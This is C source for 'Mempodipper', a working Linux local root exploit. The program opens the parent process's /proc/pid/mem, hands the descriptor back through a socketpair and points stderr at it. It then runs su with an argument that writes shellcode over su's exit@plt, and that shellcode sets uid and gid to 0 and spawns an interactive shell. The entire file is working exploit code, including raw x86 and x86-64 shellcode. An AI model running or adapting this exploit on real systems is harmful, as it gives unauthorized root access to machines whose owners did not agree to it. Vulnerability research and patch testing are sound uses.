int main(int argc, char **argv)
{
	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
		char parent_mem[256];
		sprintf(parent_mem, "/proc/%d/mem", getppid());
		printf("[+] Opening parent mem %s in child.\n", parent_mem);
		int fd = open(parent_mem, O_RDWR);
		if (fd < 0) {
			perror("[-] open");
			return 1;
		}
		printf("[+] Sending fd %d to parent.\n", fd);
		send_fd(atoi(argv[2]), fd);
		return 0;
	}
	
	printf("===============================\n");
	printf("=          Mempodipper        =\n");
	printf("=           by zx2c4          =\n");
	printf("=         Jan 21, 2012        =\n");
	printf("===============================\n\n");
	
	int sockets[2];
	printf("[+] Opening socketpair.\n");
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockets) < 0) {
		perror("[-] socketpair");
		return -1;
	}
	if (fork()) {
		printf("[+] Waiting for transferred fd in parent.\n");
		int fd = recv_fd(sockets[1]);
		printf("[+] Received fd at %d.\n", fd);
		if (fd < 0) {
			perror("[-] recv_fd");
			return -1;
		}
		printf("[+] Assigning fd %d to stderr.\n", fd);
		dup2(2, 6);
		dup2(fd, 2);

		unsigned long address;
		if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
			address = strtoul(argv[2], NULL, 16);
		else {
			printf("[+] Reading su for exit@plt.\n");
			// Poor man's auto-detection. Do this in memory instead of relying on objdump being installed.
			FILE *command = popen("objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
			char result[32];
			result[0] = 0;
			fgets(result, 32, command);
			pclose(command);
			address = strtoul(result, NULL, 16);
			if (address == ULONG_MAX || !address) {
				printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
				printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
				return 1;
			}
			printf("[+] Resolved exit@plt to 0x%lx.\n", address);
		}
		printf("[+] Calculating su padding.\n");
		FILE *command = popen("/bin/su this-user-does-not-exist 2>&1", "r");
		char result[256];
		result[0] = 0;
		fgets(result, 256, command);
		pclose(command);
		unsigned long su_padding = (strstr(result, "this-user-does-not-exist") - result) / sizeof(char);
		unsigned long offset = address - su_padding;
		printf("[+] Seeking to offset 0x%lx.\n", offset);
		lseek64(fd, offset, SEEK_SET);
		
#if defined(__i386__)
		// See shellcode-32.s in this package for the source.
		char shellcode[] =
			"\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\x31\xc9\xb3"
			"\x06\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68"
			"\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\x66\xba\x2d\x69\x52\x89"
			"\xe0\x31\xd2\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd"
			"\x80";
#elif defined(__x86_64__)
		// See shellcode-64.s in this package for the source.
		char shellcode[] =
			"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xff\xb0\x6a\x0f\x05\x40"
			"\xb7\x06\x40\xb6\x02\xb0\x21\x0f\x05\x48\xbb\x2f\x2f\x62\x69"
			"\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xdb"
			"\x66\xbb\x2d\x69\x53\x48\x89\xe1\x48\x31\xc0\x50\x51\x57\x48"
			"\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05";

#else
#error "That platform is not supported."
#endif
		printf("[+] Executing su with shellcode.\n");
		execl("/bin/su", "su", shellcode, NULL);
	} else {
		char sock[32];
		sprintf(sock, "%d", sockets[0]);
		printf("[+] Executing child from child fork.\n");
		execl("/proc/self/exe", argv[0], "-c", sock, NULL);
	}
}